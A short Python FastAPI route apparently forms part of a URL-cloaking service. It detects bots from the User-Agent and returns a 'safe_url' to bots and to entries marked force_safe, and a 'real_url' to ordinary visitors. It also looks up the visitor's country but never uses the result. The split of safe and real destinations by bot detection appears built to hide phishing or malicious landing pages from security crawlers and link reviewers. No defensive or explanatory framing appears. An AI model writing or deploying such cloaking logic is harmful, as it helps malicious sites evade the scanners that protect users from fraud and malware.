from fastapi import APIRouter, HTTPException, Depends, Request
from sqlalchemy.orm import Session
from database import get_db
from models import URLMapping
from utils import detect_bot, get_client_ip, get_country_from_ip, get_ip_info_online

router = APIRouter()


@router.get("/check/{url_id}")
async def check_url(url_id: str, request: Request, db: Session = Depends(get_db)):
    client_ip = get_client_ip(request)
    user_agent = request.headers.get("User-Agent", "")

    url_mapping = db.query(URLMapping).filter(URLMapping.id == url_id).first()

    if not url_mapping:
        raise HTTPException(status_code=404, detail="URL ID not found")

    is_bot = detect_bot(user_agent)

    # Get country info (online or offline)
    country_code = get_country_from_ip(client_ip) or get_ip_info_online(client_ip).get("country", "")

    if is_bot or url_mapping.force_safe:
        return {"redirect": url_mapping.safe_url}

    return {"redirect": url_mapping.real_url}